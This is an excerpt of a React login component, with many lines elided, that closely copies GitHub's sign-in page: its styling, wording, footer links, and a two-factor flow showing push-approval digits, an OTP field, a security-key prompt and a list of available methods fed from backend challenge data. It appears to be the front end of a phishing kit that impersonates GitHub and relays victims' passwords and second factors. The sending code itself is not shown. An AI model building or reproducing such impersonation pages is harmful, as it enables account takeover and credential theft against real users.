...
export default function LoginPage() {
  ...
  const get2FATitle = () => {
    switch (challengeType) {
      case "PUSH":
        return "Check your mobile device";
      case "EMAIL":
      ...
      case "PUSH":
        return (
          <svg
            ...
            version="1.1"
            width="32"
            className="mx-auto mb-4 fill-[#656d76]"
          >
        ...
        return (
          <div className="text-center">
            ...
            <p className="text-sm mb-4">
              We’ve sent a sign-in request on your GitHub Mobile app. Enter the
              digits shown below to verify your identity.
            </p>
            {challengeMetadata?.digits && (
              <div className="flex flex-col items-center gap-2 mb-6">
                <span className="text-6xl font-normal tracking-tighter text-[#1f2328]">
                  {challengeMetadata.digits}
                </span>
              </div>
            )}
            ...
            >
              ...
              <svg
                ...
                version="1.1"
                width="16"
                className="fill-current text-[#656d76]"
              >
          ...
          <div className="text-left">
            ...
            <div className="mb-4">
              ...
              <input
                id="otp"
                type="text"
                className="github-input text-center text-xl tracking-[0.2em]"
                placeholder="XXXXXX"
                value={twoFACode}
        ...
        return (
          <div className="text-center">
            ...
            <p className="text-sm mb-6">
              Insert your security key into a USB port or connect it via
              NFC/Bluetooth, and then follow your browser's instructions.
            </p>
            <button
              type="button"
              onClick={() => handle2FASubmit()}
              className="github-btn mb-4"
              disabled={isLoading}
            >
  ...
  return (
    <div className="min-h-screen flex flex-col items-center pt-8 px-4 bg-[#f6f8fa]">
      ...
      <div className="w-full max-w-[308px]">
        {step === "login" && (
          <>
            <h1 className="text-[24px] font-light text-center mb-4 text-[#1f2328]">
              Sign in to GitHub
            </h1>
            ...
            {error && (
              <div className="bg-[#ffebe9] border border-[#ff818266] rounded-md p-4 mb-4 text-sm text-[#1f2328] relative">
                {error}
                <button
                  className="absolute right-2 top-2 text-[#656d76] hover:text-[#1f2328]"
            ...
            <div className="bg-white border border-[#d1d9e0] rounded-md p-4 shadow-sm">
              <form onSubmit={handleLoginSubmit} className="space-y-4">
                <div>
                  <label
                    className="block text-sm mb-2 text-[#1f2328]"
                    htmlFor="login_field"
                  >
                ...
                <div>
                  <div className="flex justify-between items-center mb-2">
                    ...
                    <a
                      ...
                      className="text-[#0969da] text-xs hover:underline"
                    >
                      Forgot password?
                    </a>
                  </div>
              ...
              <form onSubmit={handle2FASubmit} className="space-y-4">
                ...
                <div className="mt-8 text-center border-t border-[#d1d9e0] pt-6">
                  <button
                    type="button"
                    onClick={() => setStep("methods")}
                    className="text-[#0969da] text-xs hover:underline font-semibold bg-transparent border-none cursor-pointer"
                  >
                    Try another method
                  </button>
                </div>
                ...
                {challengeMetadata?.availableMethods?.map((method: string) => (
                  ...
                  >
                    <div className="flex-1">
                      <div className="text-sm font-semibold text-[#1f2328] group-hover:text-[#0969da]">
                        {method}
                      </div>
                      <div className="text-[11px] text-[#656d76]">
                        {method === "PUSH"
                          ? "Approve a notification on your mobile device"
                          : method === "TOTP"
                    ...
                    <svg
                      ...
                      version="1.1"
                      width="16"
                      className="fill-[#656d76] group-hover:fill-[#0969da]"
                    >
      ...
      <footer className="mt-auto py-10 w-full max-w-[500px]">
        <ul className="flex justify-center space-x-6 text-xs text-[#0969da] list-none p-0 m-0">
          <li>
            <a href="https://github.com/site/terms" className="hover:underline">
              Terms
            </a>
          </li>
          <li>
          ...
          <li>
            <a
              ...
              className="text-[#656d76] hover:underline"
            >
              Contact GitHub
            </a>
          </li>
